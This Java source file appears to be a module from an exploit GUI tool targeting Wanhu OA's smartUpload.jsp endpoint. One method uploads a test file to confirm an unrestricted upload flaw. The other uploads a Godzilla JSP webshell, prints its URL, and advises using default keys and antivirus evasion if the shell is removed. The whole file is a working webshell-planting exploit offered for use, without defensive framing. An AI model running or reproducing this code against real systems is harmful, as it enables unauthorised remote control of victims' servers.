package exp.oa.wanhuoa;

import core.Exploitlnterface;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class wanhuoa_smartUpload implements Exploitlnterface {
    private String filename;

    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url, textArea);
    }

    private Boolean att(String url,TextArea textArea){
        Response response = HttpTools.get(url + "/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0", new HashMap<String, String>(), "utf-8");

        if(response.getCode() == 200 && response.getText().contains("请选择要上传的文件")){
            HashMap<String, String> head = new HashMap<>();
            head.put("Content-Type","multipart/form-data; boundary=----WebKitFormBoundaryDUKz5M3eZoU6nAcO");
            String post = "------WebKitFormBoundaryDUKz5M3eZoU6nAcO\r\n" +
                    "Content-Disposition: form-data; name=\"photo\"; filename=\"nishizhu.txt\"\r\n" +
                    "Content-Type: text/plain\r\n" +
                    "\r\n" +
                    shell.readFile(shell.Testpath)  + "\r\n" +
                    "------WebKitFormBoundaryDUKz5M3eZoU6nAcO\r\n" +
                    "Content-Disposition: form-data; name=\"continueUpload\"\r\n" +
                    "\r\n" +
                    "1\r\n" +
                    "------WebKitFormBoundaryDUKz5M3eZoU6nAcO\r\n" +
                    "Content-Disposition: form-data; name=\"submit\"\r\n" +
                    "\r\n" +
                    "上传继续\r\n" +
                    "------WebKitFormBoundaryDUKz5M3eZoU6nAcO--";

            Response post1 = HttpTools.post(url + "/defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png,txt&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0", post, head, "utf-8");
            if(post1.getCode() == 200 && post1.getText().contains("附件上传成功")){
                //使用正则表达式抓取
                Pattern pattern = Pattern.compile("\\d+.txt");
                Matcher matcher = pattern.matcher(post1.getText().trim());
                while (matcher.find()) {
                    filename = matcher.group();
                    break;
                }
                Response response1 = HttpTools.get(url + "/defaultroot/upload/information/" + filename , new HashMap<String, String>(), "utf-8");
                if(response1.getCode() == 200 && response1.getText().contains(shell.test_payload)){
                    Platform.runLater(()->{
                      textArea.appendText("\n 漏洞存在 测试文件写入成功 \n " + url + "/defaultroot/upload/information/" + filename);
                    });
                    return true;
                }else {
                    Platform.runLater(()->{
                      textArea.appendText("\n wanhuoa_smartUpload-RCE-漏洞不存在 (出现误报请联系作者)");
                    });
                    return false;
                }
            }else {
               Platform.runLater(()->{
                  textArea.appendText("\n wanhuoa_smartUpload-RCE-漏洞不存在 (出现误报请联系作者)");
               });
                return false;
            }
        }else {
            Platform.runLater(()->{
              textArea.appendText("\n wanhuoa_smartUpload-RCE-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }

    private Boolean shell(String url,TextArea textArea){
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type","multipart/form-data; boundary=----WebKitFormBoundaryDUKz5M3eZoU6nAcO");
        String post = "------WebKitFormBoundaryDUKz5M3eZoU6nAcO\r\n" +
                "Content-Disposition: form-data; name=\"photo\"; filename=\"nishizhu.jsp\"\r\n" +
                "Content-Type: text/plain\r\n" +
                "\r\n" +
                shell.readFile(shell.Gsljsppath)  + "\r\n" +
                "------WebKitFormBoundaryDUKz5M3eZoU6nAcO\r\n" +
                "Content-Disposition: form-data; name=\"continueUpload\"\r\n" +
                "\r\n" +
                "1\r\n" +
                "------WebKitFormBoundaryDUKz5M3eZoU6nAcO\r\n" +
                "Content-Disposition: form-data; name=\"submit\"\r\n" +
                "\r\n" +
                "上传继续\r\n" +
                "------WebKitFormBoundaryDUKz5M3eZoU6nAcO--";

        Response post1 = HttpTools.post(url + "/defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png,txt&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0", post, head, "utf-8");
        if(post1.getCode() == 200 && post1.getText().contains("附件上传成功")){
            //使用正则表达式抓取
            Pattern pattern = Pattern.compile("\\d+.jsp");
            Matcher matcher = pattern.matcher(post1.getText().trim());
            while (matcher.find()) {
                filename = matcher.group();
                break;
            }
            Response response1 = HttpTools.get(url + "/defaultroot/upload/information/" + filename , new HashMap<String, String>(), "utf-8");
            if(response1.getCode() == 200 && response1.getText().contains(shell.test_payload)){
                textArea.appendText("\n 漏洞存在 webshell文件写入成功 \n " + url + "/defaultroot/upload/information/" + filename);
                textArea.appendText("\n 使用哥斯拉4.01 jsp aes 默认密码密钥");
                return true;
            }else {
                textArea.appendText("\n");
                textArea.appendText("webshell被查杀 请进行免杀");
                return false;
            }
        }else {
            textArea.appendText("\n");
            textArea.appendText("webshell被查杀 请进行免杀");
            return false;
        }

    }
}
